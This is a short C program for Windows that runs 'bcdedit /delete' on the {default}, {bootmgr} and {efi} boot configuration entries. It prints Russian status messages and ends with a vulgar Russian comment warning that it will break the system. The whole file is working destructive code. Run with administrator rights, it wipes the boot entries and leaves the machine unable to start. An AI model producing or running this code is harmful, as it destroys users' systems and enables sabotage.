#include <stdio.h>
#include <windows.h>

int main(void)
{
    if (!system("bcdedit /delete {default}"))
        printf("уделил{default}\n");
    else
    {
        fprintf(stderr, "ошибка удаления{default}\n");
        return 1;
    }
    if (!system("bcdedit /delete {bootmgr}"))
        printf("удалил{bootmgr}\n");
    else
    {
        fprintf(stderr, "ошибка удаления{bootmgr}\n");
        return 1;
    }
    if (!system("bcdedit /delete {efi}"))
        printf("удалил{efi}\n");
    else
    {
        fprintf(stderr, "ошибка удаления{efi}\n");
        return 1;
    }
    return 0;
}
//не используйте эту залупу. Она вам нахуй систему сломает.
